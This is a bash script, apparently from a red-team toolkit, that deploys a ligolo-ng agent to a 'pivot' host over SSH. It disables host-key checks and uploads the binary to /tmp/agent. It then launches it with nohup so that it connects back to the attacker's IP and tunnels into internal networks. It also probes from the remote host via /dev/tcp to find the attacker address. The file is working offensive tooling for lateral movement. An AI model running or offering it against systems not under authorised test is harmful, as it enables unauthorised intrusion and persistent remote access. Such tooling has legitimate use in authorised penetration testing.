#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
BINS="$ROOT_DIR/tools/bins"
PROXY_PORT="${LIGOLO_PORT:-11601}"
REMOTE_PATH="${LIGOLO_REMOTE_PATH:-/tmp/agent}"

usage() {
  cat <<'EOF'
Usage:
  ./scripts/pivot/ligolo-agent.sh <pivot_ip> <user> <pass> [attacker_ip] [--arch arm64]

Arguments:
  pivot_ip      Target pivot host IP
  user          SSH username
  pass          SSH password
  attacker_ip   Your IP (auto-detected via remote connectivity test if omitted)

Options:
  --arch arm64  Use linux-arm64 binary (default: linux-amd64)
  --port PORT   Ligolo proxy port (default: 11601, or LIGOLO_PORT env)
  --key FILE    Use SSH key instead of password

Environment:
  LIGOLO_PORT         Proxy listen port (default: 11601)
  LIGOLO_REMOTE_PATH  Remote path for agent binary (default: /tmp/agent)

Examples:
  ./scripts/pivot/ligolo-agent.sh 10.1.2.10 ubuntu 'P@ssw0rd'
  ./scripts/pivot/ligolo-agent.sh 10.1.2.10 ubuntu 'P@ssw0rd' 10.1.1.5
  ./scripts/pivot/ligolo-agent.sh 10.1.2.10 root '' --key ~/.ssh/id_rsa
  ./scripts/pivot/ligolo-agent.sh 10.1.2.10 ubuntu 'pass' --arch arm64
EOF
}

# Parse arguments
ARCH="amd64"
SSH_KEY=""
PIVOT_IP=""
USER=""
PASS=""
ATTACKER_IP=""

positional=()
while [[ $# -gt 0 ]]; do
  case "$1" in
    --arch)
      ARCH="$2"; shift 2 ;;
    --port)
      PROXY_PORT="$2"; shift 2 ;;
    --key)
      SSH_KEY="$2"; shift 2 ;;
    -h|--help|help)
      usage; exit 0 ;;
    *)
      positional+=("$1"); shift ;;
  esac
done

if [[ ${#positional[@]} -lt 3 ]]; then
  echo "ERROR: missing required arguments"
  echo ""
  usage
  exit 1
fi

PIVOT_IP="${positional[0]}"
USER="${positional[1]}"
PASS="${positional[2]}"
ATTACKER_IP="${positional[3]:-}"

# Select binary
AGENT_BIN="$BINS/linux-${ARCH}/ligolo-agent"
if [[ ! -f "$AGENT_BIN" ]]; then
  echo "ERROR: agent binary not found at $AGENT_BIN"
  echo "Available:"
  ls "$BINS"/linux-*/ligolo-agent 2>/dev/null | sed 's/^/  /'
  exit 1
fi

# Build SSH options
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"

ssh_cmd() {
  if [[ -n "$SSH_KEY" ]]; then
    ssh $SSH_OPTS -o IdentitiesOnly=yes -i "$SSH_KEY" "${USER}@${PIVOT_IP}" "$@"
  else
    sshpass -p "$PASS" ssh $SSH_OPTS -o PreferredAuthentications=password "${USER}@${PIVOT_IP}" "$@"
  fi
}

scp_cmd() {
  if [[ -n "$SSH_KEY" ]]; then
    scp $SSH_OPTS -o IdentitiesOnly=yes -i "$SSH_KEY" "$1" "${USER}@${PIVOT_IP}:$2"
  else
    sshpass -p "$PASS" scp $SSH_OPTS -o PreferredAuthentications=password "$1" "${USER}@${PIVOT_IP}:$2"
  fi
}

list_remote_agent_pids() {
  ssh_cmd "ps -eo pid=,args= | awk '\$2==\"$REMOTE_PATH\" && \$3==\"-connect\" {print \$1}'" 2>/dev/null || true
}

stop_remote_agents() {
  ssh_cmd "ps -eo pid=,args= | awk '\$2==\"$REMOTE_PATH\" && \$3==\"-connect\" {print \$1}' | xargs -r kill 2>/dev/null || true"
  sleep 1
  local remain
  remain="$(list_remote_agent_pids)"
  if [[ -n "$remain" ]]; then
    ssh_cmd "ps -eo pid=,args= | awk '\$2==\"$REMOTE_PATH\" && \$3==\"-connect\" {print \$1}' | xargs -r kill -9 2>/dev/null || true"
    sleep 1
  fi
}

detect_attacker_ip() {
  # Collect all local IPv4 addresses (skip loopback)
  local candidates=()
  while IFS= read -r addr; do
    [[ -z "$addr" ]] && continue
    [[ "$addr" =~ ^127\. ]] && continue
    candidates+=("$addr")
  done < <(ifconfig 2>/dev/null | awk '/inet /{print $2}')

  if [[ ${#candidates[@]} -eq 0 ]]; then
    return 1
  fi

  # Build a test script: try connecting to each candidate IP on the proxy port
  # from the REMOTE host. First one that succeeds is the right IP.
  local test_script="for ip in ${candidates[*]}; do timeout 2 bash -c \"echo > /dev/tcp/\$ip/${PROXY_PORT}\" 2>/dev/null && echo \$ip && exit 0; done; exit 1"
  local result
  result="$(ssh_cmd "$test_script" 2>/dev/null)" || true
  result="$(echo "$result" | head -1 | tr -d '[:space:]')"

  if [[ -n "$result" ]]; then
    echo "$result"
    return 0
  fi
  return 1
}

# Resolve attacker IP
if [[ -z "$ATTACKER_IP" ]]; then
  echo "Auto-detecting attacker IP (testing from remote host)..."
  ATTACKER_IP="$(detect_attacker_ip || true)"
  if [[ -z "$ATTACKER_IP" ]]; then
    echo "ERROR: could not auto-detect attacker IP. Pass it as 4th argument."
    exit 1
  fi
  echo "Auto-detected attacker IP: $ATTACKER_IP"
fi

echo "============================================"
echo "  ligolo-agent deployer"
echo "============================================"
echo ""
echo "  Pivot host  : ${USER}@${PIVOT_IP}"
echo "  Attacker IP : ${ATTACKER_IP}:${PROXY_PORT}"
echo "  Agent arch  : linux-${ARCH}"
echo "  Remote path : ${REMOTE_PATH}"
echo "  Auth        : ${SSH_KEY:-password}"
echo ""

# Check if agent is already running
echo "[1/3] Checking remote state..."
existing="$(list_remote_agent_pids)"
has_binary="$(ssh_cmd "test -x '$REMOTE_PATH' && echo yes || echo no" 2>/dev/null)"

if [[ -n "$existing" && "$has_binary" == "yes" ]]; then
  # Binary exists and running → kill and restart (no upload needed)
  existing_fmt="$(echo "$existing" | tr '\n' ' ' | xargs)"
  echo "  Agent running (PID: $existing_fmt), binary exists at ${REMOTE_PATH}"
  echo "  Killing and restarting..."
  stop_remote_agents

  echo "[2/3] Starting agent (skip upload — binary already present)..."
  ssh_cmd "nohup ${REMOTE_PATH} -connect ${ATTACKER_IP}:${PROXY_PORT} -ignore-cert </dev/null >/dev/null 2>&1 &"
  sleep 2

elif [[ -n "$existing" ]]; then
  # Running but binary path might differ → kill, upload, start
  existing_fmt="$(echo "$existing" | tr '\n' ' ' | xargs)"
  echo "  Agent running (PID: $existing_fmt) but binary not at ${REMOTE_PATH}"
  echo "  Killing..."
  stop_remote_agents

  echo "[2/3] Uploading agent binary..."
  ssh_cmd "cat > ${REMOTE_PATH} && chmod +x ${REMOTE_PATH}" < "$AGENT_BIN"
  echo "  Uploaded to $REMOTE_PATH"

  echo "[3/3] Starting agent..."
  ssh_cmd "nohup ${REMOTE_PATH} -connect ${ATTACKER_IP}:${PROXY_PORT} -ignore-cert </dev/null >/dev/null 2>&1 &"
  sleep 2

elif [[ "$has_binary" == "yes" ]]; then
  # Binary exists but not running → just start
  echo "  Binary exists at ${REMOTE_PATH}, not running."

  echo "[2/3] Starting agent (skip upload)..."
  ssh_cmd "nohup ${REMOTE_PATH} -connect ${ATTACKER_IP}:${PROXY_PORT} -ignore-cert </dev/null >/dev/null 2>&1 &"
  sleep 2

else
  # Nothing exists → upload and start
  echo "  No agent found. Fresh deploy."

  echo "[2/3] Uploading agent binary..."
  ssh_cmd "cat > ${REMOTE_PATH} && chmod +x ${REMOTE_PATH}" < "$AGENT_BIN"
  echo "  Uploaded to $REMOTE_PATH"

  echo "[3/3] Starting agent..."
  ssh_cmd "nohup ${REMOTE_PATH} -connect ${ATTACKER_IP}:${PROXY_PORT} -ignore-cert </dev/null >/dev/null 2>&1 &"
  sleep 2
fi

# Verify
echo "[OK] Verifying..."
verify="$(list_remote_agent_pids)"
if [[ -n "$verify" ]]; then
  verify_fmt="$(echo "$verify" | tr '\n' ' ' | xargs)"
  echo "  Agent running (PID: $verify_fmt)"
  echo ""
  echo "--------------------------------------------"
  echo "  Next steps:"
  echo "    1. In ligolo console: session → ifconfig → start"
  echo "    2. $SCRIPT_DIR/ligolo-route.sh up <internal_cidr>"
  echo "--------------------------------------------"
else
  echo "  ERROR: agent does not appear to be running."
  echo "  Try manually: ssh ${USER}@${PIVOT_IP} '${REMOTE_PATH} -connect ${ATTACKER_IP}:${PROXY_PORT} -ignore-cert'"
  exit 1
fi
